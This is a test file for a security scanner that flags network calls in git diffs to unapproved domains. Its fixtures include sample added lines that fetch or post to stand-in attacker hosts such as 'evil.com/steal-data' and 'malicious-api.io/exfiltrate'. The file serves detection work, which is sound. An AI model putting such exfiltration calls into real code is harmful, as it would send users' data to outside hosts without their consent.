import { describe, expect, test } from 'bun:test';
import {
    extractDomain,
    isDomainApproved,
    scanDiff,
    formatScanReport,
} from '../lib/fetch-detector';

// ── extractDomain ───────────────────────────────────────────────────────

describe('extractDomain', () => {
    test('extracts domain from full URL', () => {
        expect(extractDomain('https://evil.com/steal')).toBe('evil.com');
        expect(extractDomain('http://api.example.org/data')).toBe('api.example.org');
    });

    test('extracts domain from URL with port', () => {
        expect(extractDomain('http://localhost:3000/api')).toBe('localhost');
    });

    test('handles template literal URLs', () => {
        expect(extractDomain('https://${HOST}/api')).toBe('placeholder');
    });

    test('returns null for invalid URLs', () => {
        expect(extractDomain('not-a-url')).toBe(null);
    });
});

// ── isDomainApproved ────────────────────────────────────────────────────

describe('isDomainApproved', () => {
    test('approves listed domains', () => {
        expect(isDomainApproved('api.anthropic.com')).toBe(true);
        expect(isDomainApproved('github.com')).toBe(true);
        expect(isDomainApproved('localhost')).toBe(true);
    });

    test('approves subdomains of listed domains', () => {
        expect(isDomainApproved('api.slack.com')).toBe(true);
        expect(isDomainApproved('uploads.github.com')).toBe(true);
    });

    test('rejects unlisted domains', () => {
        expect(isDomainApproved('evil.com')).toBe(false);
        expect(isDomainApproved('crypto-miner.io')).toBe(false);
        expect(isDomainApproved('data-exfil.example.org')).toBe(false);
    });

    test('is case-insensitive', () => {
        expect(isDomainApproved('API.ANTHROPIC.COM')).toBe(true);
        expect(isDomainApproved('GitHub.com')).toBe(true);
    });
});

// ── scanDiff ────────────────────────────────────────────────────────────

describe('scanDiff', () => {
    test('detects fetch() to unapproved domain', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
--- a/server/lib/util.ts
+++ b/server/lib/util.ts
@@ -1,3 +1,5 @@
 import { createLogger } from './logger';
+
+const data = await fetch('https://evil.com/steal-data');
 const log = createLogger('Util');
`;
        const result = scanDiff(diff);
        expect(result.hasUnapprovedFetches).toBe(true);
        expect(result.findings.length).toBe(1);
        expect(result.findings[0].domain).toBe('evil.com');
        expect(result.findings[0].pattern).toBe('fetch()');
    });

    test('ignores fetch() to approved domains', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+const response = await fetch('https://api.anthropic.com/v1/messages', {
+    method: 'POST',
+});
`;
        const result = scanDiff(diff);
        expect(result.hasUnapprovedFetches).toBe(false);
    });

    test('ignores removed lines', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
-const data = await fetch('https://evil.com/steal');
+// Removed malicious fetch
`;
        const result = scanDiff(diff);
        expect(result.hasUnapprovedFetches).toBe(false);
    });

    test('detects axios calls', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+import axios from 'axios';
+const res = await axios.post('https://malicious-api.io/exfiltrate', { data });
`;
        const result = scanDiff(diff);
        expect(result.hasUnapprovedFetches).toBe(true);
        expect(result.findings.some(f => f.domain === 'malicious-api.io')).toBe(true);
    });

    test('detects new URL() constructor', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+const endpoint = new URL('https://attacker.example.com/api');
`;
        const result = scanDiff(diff);
        expect(result.hasUnapprovedFetches).toBe(true);
        expect(result.findings[0].domain).toBe('attacker.example.com');
    });

    test('passes clean diffs', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+export function helper(x: number): number {
+    return x * 2;
+}
`;
        const result = scanDiff(diff);
        expect(result.hasUnapprovedFetches).toBe(false);
        expect(result.findings.length).toBe(0);
    });

    test('detects multiple unapproved domains', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+const a = await fetch('https://evil1.com/data');
+const b = await fetch('https://evil2.net/exfil');
`;
        const result = scanDiff(diff);
        expect(result.hasUnapprovedFetches).toBe(true);
        expect(result.findings.length).toBe(2);
    });

    test('does not double-count same domain', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+const a = await fetch('https://evil.com/endpoint1');
+const b = await fetch('https://evil.com/endpoint2');
`;
        const result = scanDiff(diff);
        expect(result.hasUnapprovedFetches).toBe(true);
        // Same domain + same pattern = deduplicated
        expect(result.findings.length).toBe(1);
    });

    test('allows localhost and 127.0.0.1', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+const a = await fetch('http://localhost:4001/v2/status');
+const b = await fetch('http://127.0.0.1:11434/api/tags');
`;
        const result = scanDiff(diff);
        expect(result.hasUnapprovedFetches).toBe(false);
    });
});

// ── formatScanReport ────────────────────────────────────────────────────

describe('formatScanReport', () => {
    test('returns empty string for clean results', () => {
        expect(formatScanReport({ hasUnapprovedFetches: false, findings: [] })).toBe('');
    });

    test('formats findings into readable report', () => {
        const report = formatScanReport({
            hasUnapprovedFetches: true,
            findings: [{
                url: 'https://evil.com/steal',
                domain: 'evil.com',
                pattern: 'fetch()',
                line: "fetch('https://evil.com/steal')",
            }],
        });
        expect(report).toContain('Security Scan Failed');
        expect(report).toContain('evil.com');
        expect(report).toContain('fetch()');
    });
});
